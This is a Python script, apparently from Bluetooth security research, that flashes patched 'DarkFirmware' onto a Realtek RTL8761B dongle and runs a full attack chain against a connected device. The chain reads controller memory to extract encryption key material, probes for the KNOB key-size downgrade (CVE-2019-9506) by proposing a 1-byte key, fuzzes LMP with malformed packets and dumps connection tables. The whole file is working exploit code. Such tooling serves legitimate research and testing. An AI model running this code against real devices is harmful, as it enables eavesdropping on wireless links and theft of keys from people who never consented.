#!/usr/bin/env python3
"""DarkFirmware Full Security Assessment Runner.

Flashes DarkFirmware, then runs all security tools in sequence:
1. Flash firmware + verify hooks
2. Bring up dongle, make discoverable
3. Wait for ACL connection (or connect to target)
4. Run encryption inspector
5. Run KNOB probe
6. Run LMP fuzzer (state tests)
7. Dump connection table
8. Generate report

Usage:
    sudo python3 run_full_assessment.py [--target BDADDR] [--skip-flash] [--skip-fuzz]

If --target is provided, actively connects to it.
If not, makes dongle discoverable and waits for incoming connection.
"""

import sys
import os
import time
import struct
import json
import argparse
import subprocess

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import usbbluetooth
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

class HCI_Cmd_VSC_Realtek_Read_Mem(Packet):
    name = "Realtek Read Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000)]
class HCI_Cmd_VSC_Realtek_Write_Mem(Packet):
    name = "Realtek Write Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000),
                   XLEIntField("data_to_write", 0x33221100)]
class HCI_Cmd_VSC_Xeno_Send_LMP(Packet):
    name = "Xeno VSC Send LMP"
    fields_desc = [XStrLenField("data", b"", length_from=lambda pkt: pkt.underlayer.underlayer.len)]
class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Read_Mem, ogf=0x3f, ocf=0x0061)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Write_Mem, ogf=0x3f, ocf=0x0062)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Xeno_Send_LMP, ogf=0x3f, ocf=0x0222)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc61)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc62)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfe22)

MARKER_AAAA = 0x41414141
BOS_BASE = 0x8012DC50
SLOT_SIZE = 0x2B8  # 696 bytes (confirmed via RE)
SECONDARY_PTR_OFFSET = 0x58


def find_device():
    for c in usbbluetooth.list_controllers():
        if ((c.vendor_id == 0x0bda and c.product_id == 0xa728) or
            (c.vendor_id == 0x0bda and c.product_id == 0xa729) or
            (c.vendor_id == 0x2c0a and c.product_id == 0x8761) or
            (c.vendor_id == 0x2550 and c.product_id == 0x8761) or
            (c.vendor_id == 0x2357 and c.product_id == 0x0604)):
            return c
    return None


def read4(sock, addr):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Read_Mem(address=addr)
    try:
        resp = sock.sr1(pkt, verbose=0, timeout=2)
        if HCI_Event_Command_Complete in resp and resp[HCI_Event_Command_Complete].status == 0:
            data = resp.data
            return bytes(data[:4]) if isinstance(data, (bytes, bytearray)) else data.to_bytes(4, 'little')
    except Exception:
        pass
    return None


def read_bytes(sock, addr, count):
    data = bytearray()
    for off in range(0, count, 4):
        chunk = read4(sock, addr + off)
        data.extend(chunk if chunk else b'\x00\x00\x00\x00')
    return bytes(data[:count])


def send_lmp(sock, conn_index, lmp_data):
    payload = bytes([conn_index]) + lmp_data
    pkt = HCI_Hdr() / HCI_Command_Hdr(ogf=0x3f, ocf=0x0222) / HCI_Cmd_VSC_Xeno_Send_LMP(data=payload)
    try:
        return sock.sr1(pkt, verbose=0, timeout=2)
    except Exception:
        return None


def collect_lmp_events(sock, timeout_sec=2.0):
    events = []
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        try:
            raw = sock.recv(timeout=0.5)
            if raw and len(raw) >= 3 and raw[0] == 0x04 and raw[1] == 0xFF:
                params = raw[3:]
                if len(params) >= 56:
                    marker = struct.unpack_from("<I", params, 0)[0]
                    if marker == MARKER_AAAA:
                        events.append(params)
        except Exception:
            break
    return events


def phase1_flash(sock):
    """Flash DarkFirmware and verify hooks."""
    print("\n" + "=" * 60)
    print("PHASE 1: Flash DarkFirmware")
    print("=" * 60)

    from RTL8761B_usbbluetooth_Patch_Writer import (
        reset, read_patch_file, read_config_file, download_patches, read
    )

    print("[*] Resetting controller...")
    reset(sock)

    print("[*] Loading patch file...")
    read_patch_file()
    read_config_file(filename="./rtl8761b_config_set_bdaddr_only_1338.bin")

    print("[*] Downloading patches...")
    result = download_patches(sock)
    if result is None:
        print("[!] FLASH FAILED")
        return False

    # Verify hooks
    data1 = read(sock, 0x80133FFC)
    val1 = int.from_bytes(data1, 'little') if data1 else 0
    data2 = read(sock, 0x80133FF8)
    val2 = int.from_bytes(data2, 'little') if data2 else 0

    hook1_ok = val1 == 0x8010D891
    hook2_ok = val2 == 0x8010DFB1

    print(f"  Hook 1 (HCI CMD): {'OK' if hook1_ok else 'FAIL'} (0x{val1:08X})")
    print(f"  Hook 2 (LMP RX):  {'OK' if hook2_ok else 'FAIL'} (0x{val2:08X})")

    # Verify mod_flag initialized
    data3 = read(sock, 0x80133FF0)
    mod_flag = data3[0] if isinstance(data3, (bytes, bytearray)) else int.from_bytes(data3, 'little') & 0xFF
    print(f"  Mod flag: {mod_flag} ({'OK' if mod_flag == 0 else 'WARN: non-zero!'})")

    return hook1_ok and hook2_ok


def phase2_inspect_encryption(sock, conn_index=0):
    """Inspect encryption state of active connection."""
    print("\n" + "=" * 60)
    print("PHASE 2: Encryption State Inspection")
    print("=" * 60)

    bos_addr = BOS_BASE + (conn_index * SLOT_SIZE)
    bdaddr_data = read_bytes(sock, bos_addr, 8)
    bdaddr = bdaddr_data[:6]

    if all(b == 0 for b in bdaddr) or all(b == 0xFF for b in bdaddr):
        print(f"  [!] Slot {conn_index}: NO ACTIVE CONNECTION")
        return None

    bdaddr_str = ':'.join(f'{b:02X}' for b in reversed(bdaddr))
    print(f"  Target: {bdaddr_str} (slot {conn_index})")

    # Read secondary struct pointer
    ptr_data = read4(sock, bos_addr + SECONDARY_PTR_OFFSET)
    if not ptr_data:
        print("  [!] Failed to read secondary struct pointer")
        return None
    sec_ptr = struct.unpack('<I', ptr_data)[0]
    print(f"  Secondary struct: 0x{sec_ptr:08X}")

    if sec_ptr < 0x80000000 or sec_ptr > 0x80140000:
        print(f"  [!] Invalid secondary pointer")
        return None

    result = {"bdaddr": bdaddr_str, "secondary_ptr": sec_ptr}

    # Read fields
    for name, offset in [("key_size", 0x23), ("enc_enabled", 0x26), ("auth_state", 0x50),
                          ("state_phase", 0x01), ("pairing_stage", 0x12), ("sc_flag", 0x214)]:
        data = read4(sock, (sec_ptr + offset) & ~3)
        if data:
            byte_val = data[(sec_ptr + offset) & 3]
            result[name] = byte_val
            print(f"  {name:20s}: 0x{byte_val:02X} ({byte_val})")

    # Read key material
    key_src = read_bytes(sock, sec_ptr + 0x02, 16)
    key_copy = read_bytes(sock, sec_ptr + 0x51, 16)
    result["key_material_src"] = key_src.hex()
    result["key_material_copy"] = key_copy.hex()

    if any(b != 0 for b in key_src):
        print(f"  key_src  (+0x02): {key_src.hex()}")
    if any(b != 0 for b in key_copy):
        print(f"  key_copy (+0x51): {key_copy.hex()}")
        print(f"  [!] NON-ZERO KEY MATERIAL FOUND")

    # Security assessment
    ks = result.get("key_size", 0)
    enc = result.get("enc_enabled", 0)
    sc = result.get("sc_flag", 0)

    if enc and ks == 1:
        print(f"  [!!!] KNOB VULNERABLE — 1-byte encryption key!")
    elif enc and ks < 7:
        print(f"  [!!] WEAK ENCRYPTION — key_size={ks}")
    elif enc:
        print(f"  [OK] Encryption: key_size={ks}, SC={'yes' if sc else 'no'}")
    else:
        print(f"  [--] Encryption not active")

    return result


def phase3_knob_probe(sock, conn_index=0, rounds=5):
    """Test for KNOB vulnerability (CVE-2019-9506)."""
    print("\n" + "=" * 60)
    print("PHASE 3: KNOB Probe (CVE-2019-9506)")
    print("=" * 60)

    result = "UNKNOWN"

    for rnd in range(1, rounds + 1):
        print(f"  Round {rnd}/{rounds}: Sending KEY_SIZE_REQ(key_size=1)...")
        lmp_pdu = bytes([0x10, 0x01])  # LMP_ENCRYPTION_KEY_SIZE_REQ, key_size=1
        send_lmp(sock, conn_index, lmp_pdu)
        time.sleep(0.5)

        events = collect_lmp_events(sock, timeout_sec=2.0)
        for evt in events:
            payload = evt[0x18:0x34]
            if len(payload) > 5:
                raw_byte = payload[4]
                opcode = raw_byte >> 1
                if opcode == 0x03:  # LMP_ACCEPTED
                    accepted_op = payload[5] >> 1
                    if accepted_op == 0x10:
                        result = "VULNERABLE"
                        print(f"  [!!!] TARGET ACCEPTED key_size=1!")
                elif opcode == 0x04:  # LMP_NOT_ACCEPTED
                    result = "NOT_VULNERABLE"
                    error = payload[6] if len(payload) > 6 else 0
                    print(f"  [OK] Target rejected (error=0x{error:02X})")
                elif opcode == 0x10:  # Counter-propose
                    counter = payload[5]
                    print(f"  [--] Target counter-proposed key_size={counter}")
                    result = "NEGOTIATING"
                else:
                    print(f"  [??] Got opcode 0x{opcode:02X}")

        if result in ("VULNERABLE", "NOT_VULNERABLE"):
            break

    print(f"  Result: {result}")
    return result


def phase4_fuzz_sample(sock, conn_index=0):
    """Run a small sample of LMP fuzz tests."""
    print("\n" + "=" * 60)
    print("PHASE 4: LMP Fuzzer (Quick Sample)")
    print("=" * 60)

    tests = [
        ("zero_opcode", bytes([0x00])),
        ("unsolicited_sres", bytes([0x0C, 0x00, 0x00, 0x00, 0x00])),
        ("setup_before_features", bytes([0x1D])),
        ("enc_before_auth", bytes([0x0F, 0x01])),
        ("knob_zero_key", bytes([0x10, 0x00])),
        ("stop_enc_no_start", bytes([0x12])),
        ("escape_invalid_ext", bytes([0x7F, 0xFF])),
        ("features_req", bytes([0x27])),
    ]

    results = []
    for name, pdu in tests:
        print(f"  [{name}] Sending 0x{pdu[0]:02X} ({len(pdu)}B)...", end=" ")
        resp = send_lmp(sock, conn_index, pdu)
        ok = resp is not None
        time.sleep(0.2)
        events = collect_lmp_events(sock, timeout_sec=0.5)

        if not ok:
            print("SEND FAILED — possible crash!")
            results.append({"name": name, "crashed": True})
            break
        else:
            print(f"ok (responses={len(events)})")
            results.append({"name": name, "crashed": False, "responses": len(events)})

    crashed = [r for r in results if r.get("crashed")]
    print(f"\n  {len(results)} tests run, {len(crashed)} crashes")
    if crashed:
        print(f"  [!!!] Crashes on: {[r['name'] for r in crashed]}")

    return results


def phase5_dump_slot(sock, conn_index=0):
    """Dump connection table slot."""
    print("\n" + "=" * 60)
    print("PHASE 5: Connection Table Dump")
    print("=" * 60)

    base = BOS_BASE + (conn_index * SLOT_SIZE)
    print(f"  Reading {SLOT_SIZE} bytes from 0x{base:08X}...")
    data = read_bytes(sock, base, SLOT_SIZE)

    # Save raw dump
    fname = f"assessment_slot{conn_index}.bin"
    with open(fname, "wb") as f:
        f.write(data)
    print(f"  Saved to {fname}")

    # Quick analysis
    bdaddr = data[:6]
    if all(b == 0 for b in bdaddr):
        print(f"  Slot {conn_index}: EMPTY")
    else:
        bdaddr_str = ':'.join(f'{b:02X}' for b in reversed(bdaddr))
        print(f"  Slot {conn_index}: {bdaddr_str}")

        # Count non-zero bytes (indicator of connection richness)
        non_zero = sum(1 for b in data if b != 0 and b != 0xFF)
        print(f"  Non-zero/non-FF bytes: {non_zero}/{SLOT_SIZE}")

    return data


def generate_report(flash_ok, enc_result, knob_result, fuzz_results, slot_data):
    """Generate JSON assessment report."""
    print("\n" + "=" * 60)
    print("ASSESSMENT REPORT")
    print("=" * 60)

    report = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "firmware": "DarkFirmware Phase 1+2 (560 bytes, 17B LMP, full logging, in-flight mod)",
        "flash_ok": flash_ok,
        "encryption": enc_result,
        "knob_cve_2019_9506": knob_result,
        "fuzz_results": fuzz_results,
        "slot_dump_size": len(slot_data) if slot_data else 0,
    }

    # Summary
    if enc_result:
        print(f"  Target: {enc_result.get('bdaddr', 'N/A')}")
        print(f"  Encryption: key_size={enc_result.get('key_size', '?')}, "
              f"enabled={enc_result.get('enc_enabled', '?')}, "
              f"SC={enc_result.get('sc_flag', '?')}")
        if any(b != '0' for b in enc_result.get('key_material_copy', '0' * 32)):
            print(f"  [!] Key material extracted: {enc_result['key_material_copy']}")
    else:
        print(f"  No active connection found for encryption inspection")

    print(f"  KNOB (CVE-2019-9506): {knob_result}")

    if fuzz_results:
        crashes = [r for r in fuzz_results if r.get("crashed")]
        print(f"  Fuzzing: {len(fuzz_results)} tests, {len(crashes)} crashes")

    fname = f"assessment_report_{time.strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"\n  Report saved to {fname}")

    return report


def main():
    parser = argparse.ArgumentParser(description="DarkFirmware Full Security Assessment")
    parser.add_argument("--target", help="Target BD_ADDR to connect to")
    parser.add_argument("--skip-flash", action="store_true", help="Skip firmware flash")
    parser.add_argument("--skip-fuzz", action="store_true", help="Skip LMP fuzzing")
    parser.add_argument("--conn", type=int, default=0, help="Connection slot index")
    args = parser.parse_args()

    print("=" * 60)
    print("  DarkFirmware Security Assessment Runner")
    print("  RTL8761B Below-HCI Bluetooth Security Research")
    print("=" * 60)

    ctrl = find_device()
    if ctrl is None:
        print("[!] No Realtek device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)
    print(f"[+] Device: VID=0x{ctrl.vendor_id:04x} PID=0x{ctrl.product_id:04x}")

    # Phase 1: Flash
    if args.skip_flash:
        print("\n[*] Skipping flash (--skip-flash)")
        flash_ok = True
    else:
        flash_ok = phase1_flash(sock)
        if not flash_ok:
            print("[!] Flash failed, aborting")
            sys.exit(1)

    # Phase 2: Encryption inspection
    enc_result = phase2_inspect_encryption(sock, args.conn)

    # Phase 3: KNOB probe
    knob_result = phase3_knob_probe(sock, args.conn)

    # Phase 4: Quick fuzz
    if args.skip_fuzz:
        print("\n[*] Skipping fuzz (--skip-fuzz)")
        fuzz_results = []
    else:
        fuzz_results = phase4_fuzz_sample(sock, args.conn)

    # Phase 5: Connection table dump
    slot_data = phase5_dump_slot(sock, args.conn)

    # Generate report
    generate_report(flash_ok, enc_result, knob_result, fuzz_results, slot_data)


if __name__ == "__main__":
    main()
